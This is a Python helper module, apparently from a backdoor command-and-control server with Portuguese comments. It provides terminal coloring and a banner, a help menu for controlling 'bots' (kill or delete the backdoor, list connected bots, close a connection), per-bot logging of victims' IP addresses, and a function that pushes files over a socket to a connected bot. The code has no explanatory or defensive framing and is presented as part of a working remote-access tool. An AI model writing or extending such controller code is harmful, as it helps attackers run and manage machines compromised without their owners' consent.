from datetime import datetime
import random
import sys
import os


def uuid():
	uuid = ''
	letras = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.lower() + '0123456789'
	for i in range(4):
		for i in range(4):
			num = random.randint(0, len(letras) - 1)
			uuid += letras[num]
		uuid += '-'
	return uuid[:-1]


class Color(object):
	''' Helper object for easily printing colored text to the terminal. '''

	# Basic console colors
	colors = {
		'W': '\033[0m',  # white (normal)
		'R': '\033[31m',  # red
		'G': '\033[32m',  # green
		'O': '\033[33m',  # orange
		'B': '\033[34m',  # blue
		'P': '\033[35m',  # purple
		'C': '\033[36m',  # cyan
		'GR': '\033[37m',  # gray
		'D': '\033[2m'  # dims current color. {W} resets.
	}

	# Helper string replacements
	replacements = {
		'{+}': ' {W}{D}[{W}{G}+{W}{D}]{W}',
		'{!}': ' {O}[{R}!{O}]{W}',
		'{?}': ' {W}[{C}?{W}]'
	}

	last_sameline_length = 0

	@staticmethod
	def p(text):
		'''
		Prints text using colored format on same line.
		Example:
				Color.p('{R}This text is red. {W} This text is white')
		'''
		sys.stdout.write(Color.s(text))
		sys.stdout.flush()
		if '\r' in text:
			text = text[text.rfind('\r') + 1:]
			Color.last_sameline_length = len(text)
		else:
			Color.last_sameline_length += len(text)

	@staticmethod
	def pl(text):
		'''Prints text using colored format with trailing new line.'''
		Color.p('%s\n' % text)
		Color.last_sameline_length = 0

	@staticmethod
	def s(text):
		''' Returns colored string '''
		output = text
		for (key, value) in Color.replacements.items():
			output = output.replace(key, value)
		for (key, value) in Color.colors.items():
			output = output.replace('{%s}' % key, value)
		return output

	@staticmethod
	def clear_line():
		spaces = ' ' * Color.last_sameline_length
		sys.stdout.write('\r%s\r' % spaces)
		sys.stdout.flush()
		Color.last_sameline_length = 0

	@staticmethod
	def clear_entire_line():
		import os
		(rows, columns) = os.popen('stty size', 'r').read().split()
		Color.p('\r' + (' ' * int(columns)) + '\r')

def banner():
	print(Color.s(' {W}   ___{P}             _     __         {R}_{P}'))
	print(Color.s(' {W}  / _/{P}__ ___  ____(_)__ / /___ __  {R}(_)__ __ _____{P}'))
	print(Color.s(' {W} / _{P}(_-</ _ \/ __/ / -_) __/ // / {R}/ (_-</ // (_-<{P}'))
	print(Color.s(' {W}/_/{P}/___/\___/\__/_/\__/\__/\_, {O}(_){P}{R}_/___/\_, /___/{P}'))
	print(Color.s('                           /___/        {R}/___/{W}'))


def local_help():
	print(Color.s(' {B}__taskkill{W} : desliga backdoor.'))
	print(Color.s(' {B}__force_taskkill{W} : apaga backdoor.'))
	print(Color.s(' {B}__close{W} : fecha conexão com bot atual.'))
	print(Color.s(' {B}__list{W} : lista bots conectados.'))
	print(Color.s(' {B}__send_file{W} : envia arquivo para bot.'))
	print(Color.s(' {B}sys.exit{W} : encerra escript.'))


def save_in_disc(mesg, uid, addr):
	if not os.path.isdir('./logging-bots'):
		os.mkdir('logging-bots')
	formatter = f'[{datetime.now().ctime()}] [{addr[0]}:{addr[1]}] {mesg}\n'
	# if not os.path.exists(f'./logging-bots/{addr[0]}-{uid}'):
	file = open(f'./logging-bots/{addr[0]}-{uid}', 'a+')
	file.write(formatter)
	file.close()


def send_file(con, path_file):
	size = os.path.getsize(path_file)
	name_file = path_file.split('/')[-1]
	con.send(f'__recv_file:{size}:{name_file}'.encode())
	file = open(path_file, 'rb')
	con.sendall(file.read())
	file.close()
	print(Color.s('{!}{B} total file send {P}%s{W} bytes' % str(size)))


def _recv(sock):
	buff_size = 4096
	data = b''
	while True:
		part = sock.recv(buff_size)
		data += part
		if len(part) < buff_size:
			break
	return data


def is_option(command, con):
	_bool = False
	if '__close' in command:  # isys encerra comunicação
		con.send(f'__exit'.encode())
		_bool = True
	elif '__taskkill' in command:
		con.send('__kill'.encode())
		_bool = True
	elif '__force_taskkill' in command:
		con.send('whoami'.encode())
		_bool = True
	return _bool


if __name__ == '__main__':
	Color.pl('{R}Testing{G}One{C}Two{P}Three{W}Done')
	Color.clear_entire_line()
	print(Color.s('{C}Testing{P}String{W}'))
	Color.pl('{+} Good line')
	Color.pl('{!} Danger')

'''
while True:
	sys.stdout.write('\r[|]{self.host}:{self.port} listening  .')
	time.sleep(0.1)
	sys.stdout.write('\r[/]{self.host}:{self.port} listening  ..')
	time.sleep(0.1)
	sys.stdout.write('\r[-]{self.host}:{self.port} listening  ...')
	time.sleep(0.1)
	sys.stdout.write('\r[\\]{self.host}:{self.port} listening  .')
	time.sleep(0.1)
sys.stdout.write('\rnew connection.')
'''
